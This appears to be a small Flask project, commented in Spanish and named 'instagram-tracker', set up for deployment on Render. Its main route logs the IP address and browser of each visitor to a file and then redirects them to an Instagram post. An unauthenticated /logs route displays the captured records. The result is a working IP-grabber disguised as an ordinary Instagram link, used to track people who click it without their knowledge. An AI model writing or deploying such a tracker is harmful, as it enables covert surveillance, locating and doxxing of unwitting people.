# ===== app.py =====
from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

# Enlace real de Instagram (destino)
URL_DESTINO = "https://www.instagram.com/p/DL8umeCsavg/"

@app.route("/")
def registrar_ip():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        agente = request.headers.get('User-Agent', 'Desconocido')
        ahora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        directorio_script = os.path.dirname(os.path.abspath(__file__))
        ruta_archivo = os.path.join(directorio_script, "ips.txt")
        
        with open(ruta_archivo, "a", encoding='utf-8') as archivo:
            linea = f"{ahora} - IP: {ip} - Navegador: {agente}\n"
            archivo.write(linea)
            archivo.flush()
        
        print(f"✅ IP registrada: {ip}")
            
    except Exception as e:
        print(f"❌ Error: {e}")
    
    return redirect(URL_DESTINO)

@app.route("/logs")
def ver_logs():
    try:
        directorio_script = os.path.dirname(os.path.abspath(__file__))
        ruta_archivo = os.path.join(directorio_script, "ips.txt")
        
        if os.path.exists(ruta_archivo):
            with open(ruta_archivo, "r", encoding='utf-8') as archivo:
                contenido = archivo.read()
                return f"<pre>{contenido}</pre>"
        else:
            return "📝 No hay logs registrados aún"
            
    except Exception as e:
        return f"❌ Error al leer logs: {e}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ===== requirements.txt =====
# Flask==2.3.3
# gunicorn==21.2.0

# ===== render.yaml =====
# services:
#   - type: web
#     name: instagram-tracker
#     env: python
#     buildCommand: pip install -r requirements.txt
#     startCommand: gunicorn app:app
